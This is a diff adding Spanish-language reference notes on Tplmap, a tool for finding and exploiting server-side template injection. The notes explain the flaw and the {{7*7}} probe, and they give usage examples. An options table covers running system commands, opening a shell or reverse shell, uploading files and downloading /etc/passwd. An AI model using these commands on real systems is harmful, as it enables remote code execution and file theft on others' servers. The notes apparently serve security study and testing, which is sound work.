@@ -1,0 +1,58 @@
+Tplmap es una herramienta de explotación de vulnerabilidades de Server-Side Template Injection (SSTI).
+
+En informática y ciberseguridad, se usa para:
+
+    > Detectar automáticamente vulnerabilidades SSTI en aplicaciones web.
+    > Identificar motores de plantillas usados en el backend (Jinja2, Twig, Mako, etc.).
+    > Automatizar la explotación de SSTI para ejecutar comandos en el sistema remoto.
+    > Conseguir Remote Code Execution (RCE) si la inyección lo permite.
+
+SSTI ocurre cuando una aplicación web evalúa entradas del usuario dentro de un motor de plantillas sin la validación adecuada (ej: {{ user_input }} en Jinja2).
+
+
+¿Para qué se usa?
+
+    > Reconocimiento            | detectar si un campo vulnerable usa un motor de plantillas.
+    > Fingerprinting            | identificar el motor exacto (Jinja2, Mako, Tornado, Django, Twig, etc.).
+    > Explotación            | inyectar payloads para ejecutar comandos.
+    > Escalación            | moverse de SSTI a RCE.
+
+    Ejemplo: Si un campo de búsqueda evalúa {{7*7}} y responde 49, ya sabemos que es vulnerable. Tplmap puede explotar eso automáticamente.
+
+
+Uso básico
+
+    python tplmap.py -u "http://objetivo.com/page?q=INJECTION"
+
+
+Opciones disponibles en Tplmap
+
+    --------------------------------------------------------------------------------------------------------------------------------------------------------------
+    |  Opción        |  Descripción                                                       |  Ejemplo de Uso                                                      |  
+    --------------------------------------------------------------------------------------------------------------------------------------------------------------
+    |  -u            |  URL objetivo con el parámetro vulnerable.                         |  -u "http://ejemplo.com/?q=test"                                     |
+    |  -d            |  Datos en POST (para testear formularios).                         |  -u "http://ejemplo.com/login" -d "username=INJECTION&password=123"  |
+    |  -c            |  Enviar cookies personalizadas.                                    |  -c "PHPSESSID=abc123"                                               |
+    |  --os-cmd      |  Ejecutar un comando del sistema en el servidor si es vulnerable.  |  --os-cmd "id"                                                       |
+    |  --os-shell    |  Abrir una shell interactiva en el servidor.                       |                                                                      |
+    |  --os-pwn      |  Intentar escalación automática (reverse shell).                   |                                                                      |
+    |  --upload      |  Subir un archivo al servidor.                                     |  --upload local.txt /tmp/remote.txt                                  |
+    |  --download    |  Descargar archivos del servidor.                                  |  --download /etc/passwd                                              |
+    |  --techniques  |  Elegir técnicas específicas (eval, exec, file_write, file_read).  |                                                                      |
+    |  --engine      |  Especificar el motor de plantillas (si ya lo conoces).            |  --engine jinja2                                                     |
+    --------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Ejemplo práctico
+
+    python tplmap.py -u "http://objetivo.com/page?q=*" --os-cmd "id"
+
+    Busca inyección SSTI en el parámetro q, y si lo encuentra, ejecuta id en el servidor.
+
+
+Resumen
+
+    > Qué es: herramienta para detectar y explotar SSTI (Server-Side Template Injection).
+    > Para qué sirve: reconocimiento, fingerprinting y explotación de motores de plantillas.
+    > Opciones útiles: -u, -d, -c, --os-cmd, --os-shell, --upload, --download.
+    > Impacto: puede llevar a RCE si el servidor es vulnerable.
